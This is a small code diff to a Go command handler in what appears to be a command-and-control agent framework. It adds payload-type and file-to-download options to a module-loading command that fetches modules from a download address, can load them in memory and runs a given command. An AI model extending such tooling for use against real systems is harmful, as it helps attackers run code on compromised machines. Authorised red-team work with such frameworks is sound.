@@ -254,6 +254,8 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		exec_cmd := flags.StringP("exec", "x", "", "Run this command to start the module")
 		checksum := flags.StringP("checksum", "c", "", "Checksum")
 		inMem := flags.BoolP("in_mem", "i", false, "Load module in memory")
+		payload_type := flags.StringP("type", "t", "", "Payload type")
+		file_to_download := flags.StringP("file_to_download", "f", "", "File to download")
 		env := flags.StringP("env", "e", "", "Set these environment variables")
 		download_addr := flags.StringP("download_addr", "d", "", "Download address from other agents")
 		flags.Parse(cmdSlice[1:])
@@ -262,7 +264,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			return
 		}
 		envParsed := strings.Split(*env, ",")
-		out = moduleHandler(*download_addr, *modName, *checksum, *exec_cmd, envParsed, *inMem)
+		out = moduleHandler(*download_addr, *file_to_download, *payload_type, *modName, *checksum, *exec_cmd, envParsed, *inMem)
 		return
 
 	// !upgrade_agent --checksum checksum
